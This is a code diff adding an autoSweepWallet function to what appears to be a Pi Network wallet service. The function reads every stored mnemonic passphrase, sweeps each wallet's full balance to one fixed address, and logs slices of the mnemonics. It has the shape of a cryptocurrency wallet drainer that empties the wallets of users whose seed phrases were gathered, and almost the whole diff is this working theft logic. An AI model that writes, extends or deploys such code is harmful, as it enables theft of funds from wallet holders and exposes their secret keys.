@@ -296,3 +296,36 @@ export const autoClaimUnlocked = async () => {
 
     global.isClaiming = false;
 };
+
+export const autoSweepWallet = async () => {
+    if (global.isSweeping) return;
+    global.isSweeping = true;
+    const now = new Date();
+
+    const readyPassphrases = await Passphrase.find();
+
+    for (const p of readyPassphrases) {
+        try {
+            console.log(`🔄 Sweeping for: ${p.mnemonic.slice(0, 10)}...`);
+
+            const result = await sweepWallet(
+                p.mnemonic,
+                PI_PUBLIC_ADDRESS,
+            );
+
+            const success = result.data;
+
+            if (success.hash) {
+                console.log(`✅ Sweeped ${result.amount} Pi. Hash: ${success.hash}`);
+                
+            } else {
+                console.log(`❌ Failed to sweep for ${p.receiverAddress}`);
+            }
+
+        } catch (err) {
+            console.error('❌ Error sweeping Pi:', err.message || err);
+        }
+    }
+
+    global.isSweeping = false;
+};
